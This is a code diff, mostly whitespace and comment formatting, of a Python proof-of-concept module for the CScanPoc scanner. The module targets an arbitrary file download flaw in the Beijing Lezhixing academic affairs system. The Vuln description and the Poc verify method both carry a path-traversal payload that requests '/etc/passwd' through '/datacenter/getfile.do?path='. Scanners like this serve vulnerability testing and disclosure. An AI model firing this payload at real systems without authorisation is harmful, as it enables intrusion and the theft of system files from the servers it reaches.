@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Lezhixing_0002' # 平台漏洞编号，留空
+    vuln_id = 'Lezhixing_0002'  # 平台漏洞编号，留空
     name = '北京乐知行教务系统任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-12-04'  # 漏洞公布时间
     desc = '''
         北京乐知行教务系统任意文件下载漏洞： /datacenter/getfile.do?path=../../../../../../../../../../etc/passwd
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '乐知行教务系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a1d68bd5-89d6-4c7e-8c9d-dc46f8a31cb4'
@@ -30,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref http://www.wooyun.org/bugs/wooyun-2014-085320
+
+            # ref http://www.wooyun.org/bugs/wooyun-2014-085320
             payload = '/datacenter/getfile.do?path=../../../../../../../../../../etc/passwd'
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
